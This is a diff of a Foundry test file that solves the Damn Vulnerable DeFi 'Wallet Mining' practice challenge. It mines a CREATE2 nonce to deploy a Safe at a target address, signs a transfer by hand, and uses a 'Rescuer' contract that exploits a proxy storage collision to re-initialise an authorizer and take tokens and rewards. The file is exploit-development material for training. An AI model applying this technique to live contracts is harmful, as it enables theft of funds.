@@ -158,35 +158,33 @@ contract WalletMiningChallenge is Test {
      */
     function test_walletMining() public checkSolvedByPlayer {
         console.log("User address:", user);
-        console.log("Deployer address:", deployer);
-        console.log("SAFE_SINGLETON_FACTORY_ADDRESS:", SAFE_SINGLETON_FACTORY_ADDRESS);
 
-        console.log("Nonce of SAFE_SINGLETON_FACTORY_ADDRESS:", vm.getNonce(SAFE_SINGLETON_FACTORY_ADDRESS));
-
-        uint256 nonce = 0;
-
+        // Find the `nonce` to deploy the Safe wallet at USER_DEPOSIT_ADDRESS
+        // Note this `nonce` is a parameter used by the SafeProxyFactory#createProxyWithNonce function,
+        // Play with https://app.safe.global/ in testnet to understand how to deploy a Safe wallet
         address[] memory owners = new address[](1);
         owners[0] = user;
+        // Initializer for the Safe contract:
+        // - Must call setup and using the default parameters are important.
         bytes memory initializer = abi.encodeWithSignature(
                                                            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                                                           owners, // owners
-                                                           1, // threshold
+                                                           owners,     // owners
+                                                           1,          // threshold
                                                            address(0), // optional delegateCall to
-                                                           bytes(""), // data for the optional delegateCall
+                                                           bytes(""),  // data for the optional delegateCall
                                                            address(0), // fallbackHandler
                                                            address(0), // paymentToken
-                                                           0, // payment
-                                                           address(0) // paymentReceiver
+                                                           0,          // payment
+                                                           address(0)  // paymentReceiver
         );
 
+        uint256 nonce = 0;
+        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+        bytes32 initCodeHash = keccak256(deploymentData);
 
         for (; ; nonce++){
-            // Test on https://app.safe.global/ using sepolia network to see how to deploy a Safe wallet
             bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
-            bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
-
-            bytes32 initCodeHash = keccak256(deploymentData);
-
+            // computeCreate2Address(bytes32 salt, bytes32 initCodeHash, address deployer)
             address safeAddress = vm.computeCreate2Address(salt, initCodeHash, address(proxyFactory));
 
             if (safeAddress == USER_DEPOSIT_ADDRESS) {
@@ -195,51 +193,80 @@ contract WalletMiningChallenge is Test {
             }
         }
 
-        SafeProxy userSafe = proxyFactory.createProxyWithNonce(
-            address(singletonCopy),
-            initializer,
-            nonce
-        );
-
-        console.log("User's Safe address:", address(userSafe));
-
+        // Construct the transaction data to transfer tokens from USER_DEPOSIT_ADDRESS to the user after the Safe wallet is deployed
         bytes memory execData = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);
-        // bytes32 txHash = keccak256(execData);
-        bytes32  txHash = Safe(payable(userSafe)).getTransactionHash(
-                                                                     address(token),      // to
-                                                                     0,                   // value
-                                                                     execData,            // data
-                                                                     Enum.Operation.Call, // operation
-                                                                     0,                   // safeTxGas
-                                                                     0,                   // baseGas
-                                                                     0,                   // gasPrice
-                                                                     address(0),          // gasToken
-                                                                     payable(0),          // refundReceiver
-                                                                     0
-        );
 
-        // (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", txHash)));
+        // // 1/2 If we just want the token inside the Safe, not in the WalletDeployer, we can create the Safe wallet directly,
+        // // You can uncomment the code below and simulate the transaction to get the txHash or even signatures, and don't have to reconstruct and compute the txHash manually
+        // SafeProxy userSafe = proxyFactory.createProxyWithNonce(
+        //     address(singletonCopy),
+        //     initializer,
+        //     nonce
+        // );
+
+        // bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
+        //                                                                          address(token),      // to
+        //                                                                          0,                   // value
+        //                                                                          execData,            // data
+        //                                                                          Enum.Operation.Call, // operation
+        //                                                                          0,                   // safeTxGas
+        //                                                                          0,                   // baseGas
+        //                                                                          0,                   // gasPrice
+        //                                                                          address(0),          // gasToken
+        //                                                                          payable(0),          // refundReceiver
+        //                                                                          0
+        // );
+        // =>
+        // bytes32 txHash = 0x8fd85e9889830254291199952e406818a81d1cf0aa324a0e6db76a1cf8a1fbfb;
+
+        bytes32 txHash;
+        bytes memory singatures;
+
+        // Compute the txHash following CompatibilityFallbackHandler#encodeTransactionData or Safe#getTransactionHash (both are the same)
+        {
+            bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
+            bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
+
+            bytes32 execDataHash = keccak256(execData);
+            bytes32 safeTxHash = keccak256(abi.encode(
+                                                      SAFE_TX_TYPEHASH,
+                                                      address(token),
+                                                      uint256(0), // value
+                                                      execDataHash,
+                                                      Enum.Operation.Call,
+                                                      uint256(0), // safeTxGas
+                                                      uint256(0), // baseGas
+                                                      uint256(0), // gasPrice
+                                                      address(0), // gasToken
+                                                      payable(0),  // refundReceiver
+                                                      uint256(0) // nonce parameter of the newly created Safe wallet, any unused value is fine
+                                           ));
+
+            bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, uint256(block.chainid), USER_DEPOSIT_ADDRESS));
+
+            assertEq(
+                     0x702df831b7f3f3971e9493ad7756d8b5457c020e0e9712294726c884f53228ca,
+                     domainSeparator,
+                     "Domain separator mismatch"
+            );
+
+            txHash = keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, safeTxHash));
+            // assertEq(txHash, 0x8fd85e9889830254291199952e406818a81d1cf0aa324a0e6db76a1cf8a1fbfb, "txHash mismatch");
+        }
 
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        singatures = abi.encodePacked(r, s, v);
 
-        bytes memory singatures = abi.encodePacked(r, s, v);
-
-        Safe(payable(userSafe)).execTransaction(
-            address(token),      // to
-            0,                   // value
-            execData,            // data
-            Enum.Operation.Call, // operation
-            0,                   // safeTxGas
-            0,                   // baseGas
-            0,                   // gasPrice
-            address(0),          // gasToken
-            payable(0),          // refundReceiver
-            singatures           // signatures
+        new Rescuer(
+            token,
+            authorizer,
+            walletDeployer,
+            nonce,
+            initializer,
+            execData,
+            singatures,
+            ward
         );
-
-        console.log("User token balance:", token.balanceOf(user));
-        console.log("USER_DEPOSIT_ADDRESS token balance: ",token.balanceOf(USER_DEPOSIT_ADDRESS));
-
     }
 
     /**
@@ -270,5 +297,48 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+
+contract Rescuer {
+    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    constructor(DamnValuableToken token,
+                AuthorizerUpgradeable authorizer,
+                WalletDeployer walletDeployer,
+                uint256 nonce,
+                bytes memory initializer,
+                bytes memory execData,
+                bytes memory singatures,
+                address ward
+    ){
+        // 2/2. However we also want the reward from the wallet deployer, so we need to deploy through the walletDeployer contract
+        // Exploit the storage conflict bewtween the AuthorizerUpgradeable#needsInit and the TransparentProxy contracts#upgrader
+        console.log("Authorizer needsInit:", authorizer.needsInit());
+        address[] memory wards= new address[](1);
+        address[] memory aims = new address[](1);
+        wards[0] = address(this);
+        aims[0] = address(USER_DEPOSIT_ADDRESS);
+        authorizer.init(wards, aims);
+        require(authorizer.can(address(this), USER_DEPOSIT_ADDRESS), "Not authorized to get rewards");
+
+        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
+
+        require(USER_DEPOSIT_ADDRESS.code.length > 0, "Deploy contract to USER_DEPOSIT_ADDRESS failed");
+
+        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            address(token),      // to
+            0,                   // value
+            execData,            // data
+            Enum.Operation.Call, // operation
+            0,                   // safeTxGas
+            0,                   // baseGas
+            0,                   // gasPrice
+            address(0),          // gasToken
+            payable(0),          // refundReceiver
+            singatures           // signatures
+        );
+
+        token.transfer(ward, token.balanceOf(address(this)));
     }
 }
